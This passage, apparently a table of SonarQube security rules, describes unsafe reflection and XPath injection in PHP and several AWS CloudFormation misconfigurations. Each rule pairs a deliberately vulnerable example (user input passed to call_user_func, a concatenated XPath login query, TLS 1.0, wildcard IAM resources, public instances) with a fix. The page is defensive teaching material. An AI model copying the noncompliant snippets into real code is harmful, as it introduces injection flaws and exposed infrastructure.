<p>Depending on the attacker, code execution can be used with different intentions:</p>
<ul><li> Download the internal server’s data, most likely to sell it. </li><li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li><li> Stop services or exhaust resources, for instance, with fork bombs. </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker additionally manages to
elevate their privileges as an administrator and attack other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
through a combination of unsafe deserialization and misconfiguration:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>In the following example, the code simulates a feature in an image editing application that allows users to install plugins to add new filters or
effects. It assumes the user will give a known name, such as &#34;SepiaEffect&#34;.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
function apply($effectName)
{
    try {
        $result &#61; call_user_func($effectName, &#34;applyFilter&#34;);
    } catch (\Throwable $e) {
        return &#34;Filter Failure&#34;;
    }

    if ( $result &#61;&#61; TRUE) {
        return &#34;Filter Success&#34;;
    }
    else {
        return &#34;Filter Failure&#34;;
    }
}

apply($_GET[&#34;filter&#34;]);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$EFFECT_ALLOW_LIST &#61; [
    &#34;SepiaEffect&#34;,
    &#34;BlackAndWhiteEffect&#34;,
    &#34;WaterColorEffect&#34;,
    &#34;OilPaintingEffect&#34;
];

function apply($effectName)
{
    global $EFFECT_ALLOW_LIST;
    if (!in_array($effectName, $EFFECT_ALLOW_LIST)) {
        return &#34;Filter Failure&#34;;
    }

    try {
        $result &#61; call_user_func($effectName, &#34;applyFilter&#34;);
    } catch (\Throwable $e) {
        return &#34;Filter Failure&#34;;
    }

    if ( $result &#61;&#61; TRUE) {
        return &#34;Filter Success&#34;;
    }
    else {
        return &#34;Filter Failure&#34;;
    }
}

apply($_GET[&#34;filter&#34;]);
</pre>
<h3>How does this work?</h3>
<h4>Pre-Approved commands</h4>
<p>The cleanest way to avoid this defect is to validate the input before using it in a reflection method.</p>
<p>Create a list of authorized and secure classes that you want the application to be able to execute.<br /> If a user input does not match an entry in
this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS, Top 25 Software Errors</a> - Insecure Interaction Between Components </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/470" rel="nofollow">MITRE, CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code (&#39;Unsafe
  Reflection&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S2091">
              phpsecurity:S2091
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>XPath injections occur in an application when the application retrieves untrusted data and inserts it into an XML Path (XPath) query without
sanitizing it first.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to XPath injection:<br /> After discovering the injection point, attackers insert data into the
vulnerable field to execute malicious commands in the affected XML documents.</p>
<p>The impact of this vulnerability depends on the importance of XML structures in the enterprise.<br /> In cases where organizations rely on XML
structures for business-critical operations or where XML is used only for innocuous data transport, the severity of an attack ranges from critical to
harmless.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Data Leaks</h4>
<p>A malicious XPath query allows direct data leakage from one or more databases. Although XML is not as widely used as it once was, this possibility
still exists with configuration files, for example.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query allows the attacker to delete data in the affected XML documents.<br /> This threat is particularly insidious if the attacked
organization does not maintain a disaster recovery plan (DRP) and if XML structures are considered important, as missing critical data can disrupt the
regular operations of an organization.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to XPath injection because untrusted data is concatenated to an XPath query without prior
validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
function authenticate(DOMXpath $xpath, string $username, string $password): bool {
    $expression &#61; &#34;/users/user[&#64;name&#61;&#39;&#34; . $username . &#34;&#39; and &#64;pass&#61;&#39;&#34; . $password . &#34;&#39;]&#34;;
    $entries &#61; $xpath-&gt;evaluate($expression);

    return $entries.length &gt; 0
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
function authenticate(DOMXpath $xpath, string $username, string $password): bool {
    if (!preg_match(&#34;/^[a-zA-Z0-9]*$/&#34;, $username) || !preg_match(&#34;/^[a-zA-Z0-9]*$/&#34;, $password)) {
        return false;
    }

    $expression &#61; &#34;/users/user[&#64;name&#61;&#39;&#34; . $username . &#34;&#39; and &#64;pass&#61;&#39;&#34; . $password . &#34;&#39;]&#34;;
    $entries &#61; $xpath-&gt;evaluate($expression);

    return $entries-&gt;length &gt; 0
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the
initially intended logic.</p>
<h4>Validation</h4>
<p>In case XPath parameterized queries are not available, the most secure way to protect against injections is to validate the input before using it
in an XPath query.</p>
<p><strong>Important</strong>: The application must do this validation server-side. Validating this client-side is insecure.</p>
<p>Input can be validated in multiple ways:</p>
<ul><li> By checking against a list of authorized and secure strings that the application is allowed to use in a query. </li><li> By ensuring user input is restricted to a specific range of characters (e.g., the regex <code>/^[a-zA-Z0-9]*$/</code> only allows alphanumeric
  characters.) </li><li> By ensuring user input does not include any XPath metacharacters, such as <code>&#34;</code>, <code>&#39;</code>, <code>/</code>, <code>&#64;</code>,
  <code>&#61;</code>, <code>*</code>, <code>[</code>, <code>]</code>, <code>(</code> and <code>)</code>. </li></ul>
<p>If user input is not considered valid, it should be rejected as it is unsafe.</p>
<p>In the compliant solution, a regex match ensures the username and password only contain alphanumeric characters before executing the XPath
query.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html#xpath-injection" rel="nofollow">OWASP, XPath Injection
  Prevention Cheat Sheet</a> </li><li> <a href="https://www.ambionics.io/blog/hacking-watchguard-firewalls#vulnerability-2-time-based-xpath-injection" rel="nofollow">Ambionics, XPath Injection
  Section of &#34;Hacking WatchGuard Firewalls&#39;</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/643" rel="nofollow">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6327">
              cloudformation:S6327
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Simple Notification Service (SNS) is a managed messaging service for application-to-application (A2A) and application-to-person (A2P)
communication. SNS topics allows publisher systems to fanout messages to a large number of subscriber systems. Amazon SNS allows to encrypt messages
when they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are not able to
access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The topic contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SNS topics that contain sensitive information. Encryption and decryption are handled transparently by SNS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-sns-topic.html" rel="nofollow">AWS::SNS::Topic</a>:</p>
<pre>
AWSTemplateFormatVersion: &#39;2010-09-09&#39;
Resources:
  Topic:  # Sensitive, encryption disabled by default
    Type: AWS::SNS::Topic
    Properties:
      DisplayName: &#34;unencrypted_topic&#34;
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-sns-topic.html" rel="nofollow">AWS::SNS::Topic</a>:</p>
<pre>
AWSTemplateFormatVersion: &#39;2010-09-09&#39;
Resources:
  Topic:
    Type: AWS::SNS::Topic
    Properties:
      DisplayName: &#34;encrypted_topic&#34;
      KmsMasterKeyId:
        Fn::GetAtt:
          - TestKey
          - KeyId
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html" rel="nofollow">AWS Documentation</a> - Encryption at rest </li><li> <a href="https://aws.amazon.com/blogs/compute/encrypting-messages-published-to-amazon-sns-with-aws-kms/" rel="nofollow">Encrypting messages published to
  Amazon SNS with AWS KMS</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S4423">
              cloudformation:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul><li> SSL versions 1.0, 2.0 and 3.0 </li><li> TLS versions 1.0 and 1.1 </li></ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in API Gateway</h2>
<h3>Code examples</h3>
<p>These code samples illustrate how to fix this issue in both APIGateway and ApiGatewayV2.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
AWSTemplateFormatVersion: &#39;2010-09-09&#39;
Resources:
  CustomApi:
    Type: AWS::ApiGateway::DomainName
    Properties:
      SecurityPolicy: &#34;TLS_1_0&#34;  # Noncompliant
</pre>
<p>The ApiGatewayV2 uses a weak TLS version by default:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
AWSTemplateFormatVersion: &#39;2010-09-09&#39;
Resources:
  CustomApi: # Noncompliant
    Type: AWS::ApiGatewayV2::DomainName
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
AWSTemplateFormatVersion: &#39;2010-09-09&#39;
Resources:
  CustomApi:
    Type: AWS::ApiGateway::DomainName
    Properties:
      SecurityPolicy: &#34;TLS_1_2&#34;
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
AWSTemplateFormatVersion: &#39;2010-09-09&#39;
Resources:
  CustomApi:
    Type: AWS::ApiGatewayV2::DomainName
    Properties:
      DomainNameConfigurations:
        - SecurityPolicy: &#34;TLS_1_2&#34;
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br /></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6304">
              cloudformation:S6304
            </a>
          </td>
          <td>
            <details>
              <p>A policy that allows identities to access all resources in an AWS account may violate <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege" rel="nofollow">the principle of least privilege</a>. Suppose an identity has permission to access
all resources even though it only requires access to some non-sensitive ones. In this case, unauthorized access and disclosure of sensitive
information will occur.</p>
<h2>Ask Yourself Whether</h2>
<p>The AWS account has more than one resource with different levels of sensitivity.</p>
<p>A risk exists if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to apply the least privilege principle, i.e., by only granting access to necessary resources. A good practice to achieve this is
to organize or <a href="https://aws.amazon.com/blogs/security/simplify-granting-access-to-your-aws-resources-by-using-tags-on-aws-iam-users-and-roles/" rel="nofollow">tag</a>
resources depending on the sensitivity level of data they store or process. Therefore, managing a secure access control is less prone to errors.</p>
<h2>Sensitive Code Example</h2>
<p>Update permission is granted for all policies using the wildcard (*) in the <code>Resource</code> property:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ExamplePolicy:
    Type: AWS::IAM::ManagedPolicy
    Properties:
        PolicyDocument:
            Version: &#34;2012-10-17&#34;
            Statement:
                - Effect: Allow
                  Action:
                    - &#34;iam:CreatePolicyVersion&#34;
                  Resource:
                    - &#34;*&#34; # Sensitive
        Roles:
            - !Ref MyRole
</pre>
<h2>Compliant Solution</h2>
<p>Restrict update permission to the appropriate subset of policies:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ExamplePolicy:
    Type: AWS::IAM::ManagedPolicy
    Properties:
        PolicyDocument:
            Version: &#34;2012-10-17&#34;
            Statement:
                - Effect: Allow
                  Action:
                    - &#34;iam:CreatePolicyVersion&#34;
                  Resource:
                    - !Sub &#34;arn:aws:iam::${AWS::AccountId}:policy/team1/*&#34;
        Roles:
            - !Ref MyRole
</pre>
<h2>Exceptions</h2>
<ul><li> Should not be raised on key policies (when AWS KMS actions are used.) </li><li> Should not be raised on policies not using any resources (if and only if all actions in the policy never require resources.) </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege" rel="nofollow">AWS Documentation</a> - Grant least
  privilege </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6249">
              cloudformation:S6249
            </a>
          </td>
          <td>
            <details>
              <p>By default, S3 buckets can be accessed through HTTP and HTTPs protocols.</p>
<p>As HTTP is a clear-text protocol, it lacks the encryption of transported data, as well as the capability to build an authenticated connection. It
means that a malicious actor who is able to intercept traffic from the network can read, modify or corrupt the transported content.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The S3 bucket stores sensitive information. </li><li> The infrastructure has to comply with AWS Foundational Security Best Practices standard. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to deny all HTTP requests:</p>
<ul><li> for all objects (<code>*</code>) of the bucket </li><li> for all principals (<code>*</code>) </li><li> for all actions (<code>*</code>) </li></ul>
<h2>Sensitive Code Example</h2>
<p>No secure policy is attached to this S3 bucket:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: &#39;AWS::S3::Bucket&#39; # Sensitive
</pre>
<p>A policy is defined but forces only HTTPs communication for some users:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: &#39;AWS::S3::Bucket&#39; # Sensitive
    Properties:
      BucketName: &#34;mynoncompliantbucket&#34;

  S3BucketPolicy:
    Type: &#39;AWS::S3::BucketPolicy&#39;
    Properties:
      Bucket: !Ref S3Bucket
      PolicyDocument:
        Version: &#34;2012-10-17&#34;
        Statement:
          - Effect: Deny
            Principal:
              AWS: # Sensitive: only one principal is forced to use https
                - &#39;arn:aws:iam::123456789123:root&#39;
            Action: &#34;*&#34;
            Resource: arn:aws:s3:::mynoncompliantbuckets6249/*
            Condition:
              Bool:
                &#34;aws:SecureTransport&#34;: false
</pre>
<h2>Compliant Solution</h2>
<p>A secure policy that denies the use of all HTTP requests:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: &#39;AWS::S3::Bucket&#39; # Compliant
    Properties:
      BucketName: &#34;mycompliantbucket&#34;

  S3BucketPolicy:
    Type: &#39;AWS::S3::BucketPolicy&#39;
    Properties:
      Bucket: &#34;mycompliantbucket&#34;
      PolicyDocument:
        Version: &#34;2012-10-17&#34;
        Statement:
          - Effect: Deny
            Principal:
              AWS: &#34;*&#34; # all principals should use https
            Action: &#34;*&#34; # for any actions
            Resource: arn:aws:s3:::mycompliantbucket/* # for any resources
            Condition:
              Bool:
                &#34;aws:SecureTransport&#34;: false
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html#transit" rel="nofollow">AWS documentation</a> - Enforce encryption
  of data in transit </li><li> <a href="https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-standards-fsbp-controls.html#fsbp-s3-5" rel="nofollow">AWS Foundational Security
  Best Practices controls</a> - S3 buckets should require requests to use Secure Socket Layer </li><li> <a href="https://cwe.mitre.org/data/definitions/319" rel="nofollow">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6329">
              cloudformation:S6329
            </a>
          </td>
          <td>
            <details>
              <p>Enabling public network access to cloud resources can affect an organization’s ability to protect its data or internal operations from data theft
or disruption.</p>
<p>Depending on the component, inbound access from the Internet can be enabled via:</p>
<ul><li> a boolean value that explicitly allows access to the public network. </li><li> the assignment of a public IP address. </li><li> database firewall rules that allow public IP ranges. </li></ul>
<p>Deciding to allow public access may happen for various reasons such as for quick maintenance, time saving, or by accident.</p>
<p>This decision increases the likelihood of attacks on the organization, such as:</p>
<ul><li> data breaches. </li><li> intrusions into the infrastructure to permanently steal from it. </li><li> and various malicious traffic, such as DDoS attacks. </li></ul>
<h2>Ask Yourself Whether</h2>
<p>This cloud resource:</p>
<ul><li> should be publicly accessible to any Internet user. </li><li> requires inbound traffic from the Internet to function properly. </li></ul>
<p>There is a risk if you answered no to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid publishing cloud services on the Internet unless they are intended to be publicly accessible, such as customer portals or e-commerce
sites.</p>
<p>Use private networks (and associated private IP addresses) and VPC peering or other secure communication tunnels to communicate with other cloud
components.</p>
<p>The goal is to prevent the component from intercepting traffic coming in via the public IP address. If the cloud resource does not support the
absence of a public IP address, assign a public IP address to it, but do not create listeners for the public IP address.</p>
<h2>Sensitive Code Example</h2>
<p>DMS and EC2 instances have a public IP address assigned to them:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  DMSInstance:
    Type: AWS::DMS::ReplicationInstance
    Properties:
      PubliclyAccessible: true # sensitive, by default it&#39;s also set to true

  EC2Instance:
    Type: AWS::EC2::Instance
    Properties:
      NetworkInterfaces:
        - AssociatePublicIpAddress: true # sensitive, by default it&#39;s also set to true
          DeviceIndex: &#34;0&#34;
</pre>
<h2>Compliant Solution</h2>
<p>DMS and EC2 instances doesn’t have a public IP address:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  DMSInstance:
    Type: AWS::DMS::ReplicationInstance
    Properties:
      PubliclyAccessible: false

  EC2Instance:
    Type: AWS::EC2::Instance
    Properties:
      NetworkInterfaces:
        - AssociatePublicIpAddress: false
          DeviceIndex: &#34;0&#34;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html" rel="nofollow">AWS Documentation</a> - Amazon EC2 instance IP
  addressing </li><li> <a href="https://docs.aws.amazon.com/dms/latest/userguide/CHAP_ReplicationInstance.PublicPrivate.html" rel="nofollow">AWS Documentation</a> - Public and
  private replication instances </li><li> <a href="https://docs.aws.amazon.com/vpc/latest/peering/what-is-vpc-peering.html" rel="nofollow">AWS Documentation</a> - VPC Peering </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/668" rel="nofollow">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6245">
              cloudformation:S6245
            </a>
          </td>
          <td>
            <details>
              <p>Server-side encryption (SSE) encrypts an object (not the metadata) as it is written to disk (where the S3 bucket resides) and decrypts it as it is
read from disk. This doesn’t change the way the objects are accessed, as long as the user has the necessary permissions, objects are retrieved as if
they were unencrypted. Thus, SSE only helps in the event of disk thefts, improper disposals of disks and other attacks on the AWS infrastructure
itself.</p>
<p>There are three SSE options:</p>
<ul><li> Server-Side Encryption with Amazon S3-Managed Keys (SSE-S3)
    <ul><li> AWS manages encryption keys and the encryption itself (with AES-256) on its own. </li></ul>  </li><li> Server-Side Encryption with Customer Master Keys (CMKs) Stored in AWS Key Management Service (SSE-KMS)
    <ul><li> AWS manages the encryption (AES-256) of objects and encryption keys provided by the AWS KMS service. </li></ul>  </li><li> Server-Side Encryption with Customer-Provided Keys (SSE-C)
    <ul><li> AWS manages only the encryption (AES-256) of objects with encryption keys provided by the customer. AWS doesn’t store the customer’s
      encryption keys. </li></ul>  </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> The S3 bucket stores sensitive information. </li><li> The infrastructure needs to comply to some regulations, like HIPAA or PCI DSS, and other standards. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to use SSE. Choosing the appropriate option depends on the level of control required for the management of encryption keys.</p>
<h2>Sensitive Code Example</h2>
<p>Server-side encryption is not used:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: &#39;AWS::S3::Bucket&#39; # Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Server-side encryption with Amazon S3-Managed Keys is used:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: &#39;AWS::S3::Bucket&#39; # Compliant
    Properties:
      BucketEncryption:
        ServerSideEncryptionConfiguration:
          - ServerSideEncryptionByDefault:
              SSEAlgorithm: AES256
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/serv-side-encryption.html" rel="nofollow">AWS documentation</a> - Protecting data using
  server-side encryption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
